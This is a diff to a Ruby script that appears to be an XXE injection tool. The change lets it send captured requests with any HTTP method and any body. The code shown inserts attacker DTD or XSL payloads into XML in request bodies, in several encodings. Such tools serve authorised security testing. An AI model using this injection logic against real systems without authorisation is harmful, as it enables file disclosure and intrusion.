@@ -65,7 +65,7 @@ $directpath = ""
 blacklist = Array.new
 whitelist = Array.new
 # other variables
-$method = "post" # HTTP method - get/post
+$method = "POST" # HTTP method
 cmp = "" # holds user input
 switch = 0 # this switch locks enumeration if response is pending
 i = 0 # main counter
@@ -259,10 +259,8 @@ def configreq()
 
 	found = 0 # for detecting injected DTD
 
-	# check HTTP method
-	if File.readlines($file)[0].include?("GET ")
-		$method = "get"
-	end
+	# assign HTTP method
+	$method = File.readlines($file)[0].split(" ")[0]
 
 	# get URI path
 	$uri = File.readlines($file)[0].split(" ")[1]
@@ -345,99 +343,97 @@ def configreq()
 		i = i + 1
 	end
 
-	# get POST body
+	# get body
 	i = i + 1
 	$post = ""
 	postfind = 0
-	if $method == "post"
-		loop do
-			break if File.readlines($file)[i].nil?
-			postline = File.readlines($file)[i]
-			if $dtdi == "y"
-				tline = URI.decode(postline).gsub("+", " ")
-				if tline.include?("XXEINJECT") && $xslt == "n"
-					if $direct != ""
-						postline = postline.sub("XXEINJECT", $rproto + ":///#{$directpath}")
-						found = found + 1
-					elsif $urlencode == "y"
-						if $xslt == "n"
-							postline = postline.sub("XXEINJECT", URI.encode($dtd).gsub("%20", "+"))
-						else
-							postline = postline.sub("XXEINJECT", URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D"))
-						end
-						found = found + 1
+	loop do
+		break if File.readlines($file)[i].nil?
+		postline = File.readlines($file)[i]
+		if $dtdi == "y"
+			tline = URI.decode(postline).gsub("+", " ")
+			if tline.include?("XXEINJECT") && $xslt == "n"
+				if $direct != ""
+					postline = postline.sub("XXEINJECT", $rproto + ":///#{$directpath}")
+					found = found + 1
+				elsif $urlencode == "y"
+					if $xslt == "n"
+						postline = postline.sub("XXEINJECT", URI.encode($dtd).gsub("%20", "+"))
 					else
-						if $xslt == "n"
-							postline = postline.sub("XXEINJECT", $dtd)
-						else
-							postline = postline.sub("XXEINJECT", $xsl)
-						end
-						found = found + 1
+						postline = postline.sub("XXEINJECT", URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D"))
 					end
-					puts "DTD injected." if $verbose == "y"
-				elsif tline.include?("XXEINJECT") && $xslt == "y"
-					postfind = 1
-				elsif tline.include?("<?xml") && $xslt == "n" && $direct == ""
-					if $urlencode == "y"
-							postline = postline.sub("?>", "?>" + URI.encode($dtd).gsub("%20", "+"))
-							postline = postline.sub(/(\?%3e)/i, '\1' + URI.encode($dtd).gsub("%20", "+"))
-							postline = postline.sub(/(%3f>)/i, '\1' + URI.encode($dtd).gsub("%20", "+"))
-							postline = postline.sub(/(%3f%3e)/i, '\1' + URI.encode($dtd).gsub("%20", "+"))
-							found = found + 1
+					found = found + 1
+				else
+					if $xslt == "n"
+						postline = postline.sub("XXEINJECT", $dtd)
 					else
-							postline = postline.sub("?>", "?>" + $dtd)
-							postline = postline.sub(/(\?%3e)/i, '\1' + $dtd)
-							postline = postline.sub(/(%3f>)/i, '\1' + $dtd)
-							postline = postline.sub(/(%3f%3e)/i, '\1' + $dtd)
-							found = found + 1
+						postline = postline.sub("XXEINJECT", $xsl)
 					end
-					puts "DTD injected." if $verbose == "y"
-				elsif tline.include?("<?xml") && $xslt == "y"
-					postfind = 1
+					found = found + 1
 				end
+				puts "DTD injected." if $verbose == "y"
+			elsif tline.include?("XXEINJECT") && $xslt == "y"
+				postfind = 1
+			elsif tline.include?("<?xml") && $xslt == "n" && $direct == ""
+				if $urlencode == "y"
+						postline = postline.sub("?>", "?>" + URI.encode($dtd).gsub("%20", "+"))
+						postline = postline.sub(/(\?%3e)/i, '\1' + URI.encode($dtd).gsub("%20", "+"))
+						postline = postline.sub(/(%3f>)/i, '\1' + URI.encode($dtd).gsub("%20", "+"))
+						postline = postline.sub(/(%3f%3e)/i, '\1' + URI.encode($dtd).gsub("%20", "+"))
+						found = found + 1
+				else
+						postline = postline.sub("?>", "?>" + $dtd)
+						postline = postline.sub(/(\?%3e)/i, '\1' + $dtd)
+						postline = postline.sub(/(%3f>)/i, '\1' + $dtd)
+						postline = postline.sub(/(%3f%3e)/i, '\1' + $dtd)
+						found = found + 1
+				end
+				puts "DTD injected." if $verbose == "y"
+			elsif tline.include?("<?xml") && $xslt == "y"
+				postfind = 1
 			end
-			$post += postline
-			i = i + 1
 		end
-		if postfind == 1
-			if $urlencode == "y"
-				if $post.match(/(\<\?xml)(.*)(&)/im) || $post.match(/(%3c%3fxml)(.*)(&)/im) || $post.match(/(%3c\?xml)(.*)(&)/im) || $post.match(/(\<%3fxml)(.*)(&)/im)
-					$post = $post.sub(/(\<\?xml)(.*)(&)/im, URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D") + "&")
-					$post = $post.sub(/(%3c%3fxml)(.*)(&)/im, URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D") + "&")
-					$post = $post.sub(/(%3c\?xml)(.*)(&)/im, URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D") + "&")
-					$post = $post.sub(/(\<%3fxml)(.*)(&)/im, URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D") + "&")
-				elsif $post.match(/(\<\?xml)(.*)/im) || $post.match(/(%3c%3fxml)(.*)/im) || $post.match(/(%3c\?xml)(.*)/im) || $post.match(/(\<%3fxml)(.*)/im)
-					$post = $post.sub(/(\<\?xml)(.*)/im, URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D"))
-					$post = $post.sub(/(%3c%3fxml)(.*)/im, URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D"))
-					$post = $post.sub(/(%3c\?xml)(.*)/im, URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D"))
-					$post = $post.sub(/(\<%3fxml)(.*)/im, URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D"))
-				else
-					$post = $post.sub("XXEINJECT", URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D"))
-				end
-				puts "DTD injected." if $verbose == "y"
-				found = found + 1
+		$post += postline
+		i = i + 1
+	end
+	if postfind == 1
+		if $urlencode == "y"
+			if $post.match(/(\<\?xml)(.*)(&)/im) || $post.match(/(%3c%3fxml)(.*)(&)/im) || $post.match(/(%3c\?xml)(.*)(&)/im) || $post.match(/(\<%3fxml)(.*)(&)/im)
+				$post = $post.sub(/(\<\?xml)(.*)(&)/im, URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D") + "&")
+				$post = $post.sub(/(%3c%3fxml)(.*)(&)/im, URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D") + "&")
+				$post = $post.sub(/(%3c\?xml)(.*)(&)/im, URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D") + "&")
+				$post = $post.sub(/(\<%3fxml)(.*)(&)/im, URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D") + "&")
+			elsif $post.match(/(\<\?xml)(.*)/im) || $post.match(/(%3c%3fxml)(.*)/im) || $post.match(/(%3c\?xml)(.*)/im) || $post.match(/(\<%3fxml)(.*)/im)
+				$post = $post.sub(/(\<\?xml)(.*)/im, URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D"))
+				$post = $post.sub(/(%3c%3fxml)(.*)/im, URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D"))
+				$post = $post.sub(/(%3c\?xml)(.*)/im, URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D"))
+				$post = $post.sub(/(\<%3fxml)(.*)/im, URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D"))
 			else
-				if $post.match(/(\<\?xml)(.*)(&)/im) || $post.match(/(%3c%3fxml)(.*)(&)/im) || $post.match(/(%3c\?xml)(.*)(&)/im) || $post.match(/(\<%3fxml)(.*)(&)/im)
-					$post = $post.sub(/(\<\?xml)(.*)(&)/im, $xsl + "&")
-					$post = $post.sub(/(%3c%3fxml)(.*)(&)/im, $xsl + "&")
-					$post = $post.sub(/(%3c\?xml)(.*)(&)/im, $xsl + "&")
-					$post = $post.sub(/(\<%3fxml)(.*)(&)/im, $xsl + "&")
-				elsif $post.match(/(\<\?xml)(.*)/im) || $post.match(/(%3c%3fxml)(.*)/im) || $post.match(/(%3c\?xml)(.*)/im) || $post.match(/(\<%3fxml)(.*)/im)
-					$post = $post.sub(/(\<\?xml)(.*)/im, $xsl)
-					$post = $post.sub(/(%3c%3fxml)(.*)/im, $xsl)
-					$post = $post.sub(/(%3c\?xml)(.*)/im, $xsl)
-					$post = $post.sub(/(\<%3fxml)(.*)/im, $xsl)
-				else
-					$post = $post.sub("XXEINJECT", $xsl.gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D"))
-				end
-				puts "DTD injected." if $verbose == "y"
-				found = found + 1
+				$post = $post.sub("XXEINJECT", URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D"))
 			end
+			puts "DTD injected." if $verbose == "y"
+			found = found + 1
+		else
+			if $post.match(/(\<\?xml)(.*)(&)/im) || $post.match(/(%3c%3fxml)(.*)(&)/im) || $post.match(/(%3c\?xml)(.*)(&)/im) || $post.match(/(\<%3fxml)(.*)(&)/im)
+				$post = $post.sub(/(\<\?xml)(.*)(&)/im, $xsl + "&")
+				$post = $post.sub(/(%3c%3fxml)(.*)(&)/im, $xsl + "&")
+				$post = $post.sub(/(%3c\?xml)(.*)(&)/im, $xsl + "&")
+				$post = $post.sub(/(\<%3fxml)(.*)(&)/im, $xsl + "&")
+			elsif $post.match(/(\<\?xml)(.*)/im) || $post.match(/(%3c%3fxml)(.*)/im) || $post.match(/(%3c\?xml)(.*)/im) || $post.match(/(\<%3fxml)(.*)/im)
+				$post = $post.sub(/(\<\?xml)(.*)/im, $xsl)
+				$post = $post.sub(/(%3c%3fxml)(.*)/im, $xsl)
+				$post = $post.sub(/(%3c\?xml)(.*)/im, $xsl)
+				$post = $post.sub(/(\<%3fxml)(.*)/im, $xsl)
+			else
+				$post = $post.sub("XXEINJECT", $xsl.gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D"))
+			end
+			puts "DTD injected." if $verbose == "y"
+			found = found + 1
 		end
 	end
 
 	# update Content-Length header
-	if $method == "post"
+	if $headers.include? 'Content-Length'
 		$headers["Content-Length"] = String($post.bytesize)
 	end
 
@@ -465,9 +461,7 @@ end
 if $secfile != ""
 
 	# check HTTP method
-	if File.readlines($secfile)[0].include?("GET ")
-		$secmethod = "get"
-	end
+	$secmethod = File.readlines($secfile)[0].split(" ")[0]
 
 	# get URI path
 	$securi = File.readlines($secfile)[0].split(" ")[1]
@@ -487,16 +481,14 @@ if $secfile != ""
 		y = y + 1
 	end
 
-	# get POST body
+	# get body
 	y = y + 1
 	$secpost = ""
-	if $method == "post"
-		loop do
-			break if File.readlines($secfile)[y].nil?
-			postline = File.readlines($secfile)[y]
-			$secpost += postline
-			y = y + 1
-		end
+	loop do
+		break if File.readlines($secfile)[y].nil?
+		postline = File.readlines($secfile)[y]
+		$secpost += postline
+		y = y + 1
 	end
 
 	# configuring 2nd request
@@ -523,8 +515,8 @@ def sendreq()
 		end
 		puts "\nHeaders:"
 		puts $headers
-		if $method == "post"
-			puts "\nPOST body:"
+		if $post != ""
+			puts "\nRequest body:"
 			puts $post
 		end
 		exit(1)
@@ -550,18 +542,16 @@ def sendreq()
 	end
 
 	$response = ""
-	$request.start { |r|
-		begin
-			status = Timeout::timeout($time) {
-    				if $method == "post"
-					$response = r.post($uri, $post, $headers) 
-				else
-					$response = r.get($uri, $headers)
-				end
-  			}
-		rescue Timeout::Error
-		end
-	}
+	begin
+		status = Timeout::timeout($time) {
+			if ['GET', 'HEAD', 'TRACE', 'OPTIONS', 'MOVE', 'COPY', 'DELETE'].include? $method
+				$response = $request.send_request($method, $uri, nil, $headers)
+			else
+				$response = $request.send_request($method, $uri, $post, $headers)
+			end
+		}
+	rescue Timeout::Error
+	end
 end
 
 # Sending second request
@@ -587,18 +577,16 @@ def send2ndreq()
 	end
 	
 	$response = ""
-	$secrequest.start { |r|
-		begin
-			status = Timeout::timeout($time) {
-    				if $method == "post"
-					$response = r.post($securi, $secpost, $secheaders) 
-				else
-					$response = r.get($securi, $secheaders)
-				end
-  			}
-		rescue Timeout::Error
-		end
-	}
+	begin
+		status = Timeout::timeout($time) {
+			if ['GET', 'HEAD', 'TRACE', 'OPTIONS', 'MOVE', 'COPY', 'DELETE'].include? $secmethod
+				$response = $secrequest.send_request($secmethod, $securi, nil, $secheaders)
+			else
+				$response = $secrequest.send_request($secmethod, $securi, $secpost, $secheaders)
+			end
+		}
+	rescue Timeout::Error
+	end
 end
 
 # logging to separate file or output file if in bruteforce mode
@@ -1309,3 +1297,4 @@ loop do
 		sleep timeout
 	end
 end
+
